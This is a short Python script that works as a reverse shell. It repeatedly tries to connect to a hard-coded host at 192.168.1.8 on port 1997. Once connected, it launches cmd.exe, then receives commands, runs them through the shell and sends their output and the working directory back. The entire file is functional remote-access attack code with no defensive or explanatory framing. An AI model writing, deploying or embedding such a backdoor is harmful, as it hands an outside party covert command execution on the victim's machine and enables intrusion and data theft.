import socket,subprocess,os,sys,time

clientAddress=("192.168.1.8",1997)

#try to revers connect to client, return true if connection is enstablished, false if not
def tryConnection(sock, address):
    try:
        sock.connect(address)
        return True
    except:
        return False

#try every delay second to connect
def waitForConnection(sock, address, delay):
    connect = False
    while not connect:
        connect = tryConnection(sock, address)
        time.sleep(delay)

if __name__ == "__main__":
    client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    waitForConnection(client,clientAddress,1)
    cm = subprocess.Popen("cmd.exe",stdin=subprocess.PIPE,stdout=subprocess.PIPE)
    client.sendall(cm.communicate()[0])

    while True:
        command = client.recv(2048).decode("utf-8")
        if command[:2]=="cd":
            try:
                os.chdir(command[2:])
            except:
                pass
        if len(command)>0:
            cmd = subprocess.Popen(command,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True,text=True)
            out, err = cmd.communicate()
            client.sendall((out + err + "\n" + os.getcwd() + ">").encode("utf-8"))

